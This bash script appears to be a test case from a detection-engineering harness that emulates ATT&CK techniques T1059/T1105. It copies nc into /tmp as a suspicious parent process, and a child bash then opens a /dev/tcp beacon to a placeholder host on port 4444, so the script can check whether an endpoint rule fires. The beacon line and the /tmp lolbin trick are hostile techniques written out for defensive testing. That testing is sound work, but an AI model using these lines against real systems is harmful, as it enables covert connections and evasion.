#!/usr/bin/env bash
# T1059+T1105 (Tier B) — a suspicious PARENT (lolbin in /tmp) forks a BENIGN child
# (a shell) that does the connect. Historically a pid-join-only miss; P0-1 shipped
# ancestry inheritance, so this may now fire `suspicious_ancestor` on the 9002 →
# scored GAP_CLOSED (the harness reports the improvement, doesn't hide it).
set -eu
host="${SINK_EXTERNAL:-203.0.113.10}"
port="${SINK_PORT:-4444}"
src="$(command -v nc || command -v xxd || command -v base64)"
cp -f "$src" /tmp/nc && chmod +x /tmp/nc
# Parent = /tmp/nc (suspicious); it forks a plain `bash` child that beacons.
timeout 6 /tmp/nc -c "bash -c \"timeout 3 bash -c 'exec 3<>/dev/tcp/${host}/${port}' 2>/dev/null\"; sleep 1" 2>/dev/null || true
